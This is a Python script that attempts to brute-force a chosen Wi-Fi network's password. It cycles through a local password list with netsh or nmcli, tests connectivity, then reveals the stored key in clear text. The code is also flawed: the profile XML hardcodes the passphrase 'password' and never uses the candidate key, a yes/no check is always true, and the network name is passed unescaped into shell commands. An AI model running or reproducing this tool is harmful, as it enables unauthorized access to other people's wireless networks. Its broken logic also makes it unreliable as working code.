import os
import platform
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import subprocess


url = "http://www.python.org"
timeout = 5
print("[LOADING] Searching if connected to any network")




import sys, os, traceback, types
from runasadmin import *

run_as_admin()
def createNewConnection(name, SSID, key):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>gauthier</name>
    <SSIDConfig>
        <SSID>
            <name>""" + SSID + """</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>password</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    if platform.system() == "Windows":
        command = "netsh wlan add profile filename=\"" + name + ".xml\"" + " interface=Wi-Fi"
        with open(name + ".xml", 'w') as file:
            file.write(config)
    elif platform.system() == "Linux":
        command = "nmcli dev wifi connect '" + SSID + "' password '" + key + "'"
    os.system(command)
    if platform.system() == "Windows":
        os.remove(name + ".xml")


def connect(name, SSID):
    command = "netsh wlan connect name={} ssid={} interface=Wi-Fi ".format(name,SSID)
    os.system(command)

    
    """result = subprocess.run(['netsh', 'wlan', 'connect', f'name="{name}"', f'ssid="{SSID}"', 'interface=Wi-Fi'],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    print(result.stdout,flush=True)
    print(result.stderr,flush=True)"""


def displayAvailableNetworks():
    WIFI = "Wi-Fi"
    command ="netsh wlan show networks interface=Wi-Fi"
    os.system(command)
    """result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'interface=Wi-Fi'])
    print(result.stdout)
    print(result.stderr)"""


try:
    request = requests.get(url, timeout=timeout)
    print("[-] Please disconnect your internet for this operation to work, try again later"), exit()

except (requests.ConnectionError, requests.Timeout) as exception:
    print("[LOADING] Loading program...",flush=True), time.sleep(1)
    pass

connected = True
while connected:
    try:
        displayAvailableNetworks()
        WIFI = input("WIFI Name: ")
        os.system("echo test")

        with open("passwords", "r") as f:
            for line in f:
                words = line.split()
                if words:
                    print(f"Password: {words[0]}")
                    sys.stdout.flush()
                    createNewConnection(WIFI, WIFI, words[0])
                    connect(WIFI, WIFI)
                    try:
                        session = requests.Session()
                        retry = Retry(connect=3, backoff_factor=0.5)
                        adapter = HTTPAdapter(max_retries=retry)
                        session.mount('http://', adapter)
                        session.mount('https://', adapter)
                        r = session.get(url)
                        print(r)
                        connected = False
                        choice = input(
                            f"[+] The password might have been cracked, are you connected to {WIFI} (y/N) ? ")
                        if choice == "y":
                            print("\n[EXITING] Operation canceled")
                            exit()
                        elif choice == "n":
                            print("\n[-] Operation continues\n")

                    except :

                        print("[LOADING] Loading program..."), time.sleep(1)

        print("[+] Operation complete")
        choice = input("See WIFI Information (y/N) ? ")
        if choice == "y" or "Y":
            print(f"[LOADING] Searching for {WIFI} network")
            time.sleep(1)
            os.system(f'netsh wlan show profile name="{WIFI}" key=clear')
        elif choice == "n" or "N":
            print("\n[EXITING] Exiting program...")
            time.sleep(2)

    except KeyboardInterrupt as e:
        print("\n[[EXITING] Aborting program...")
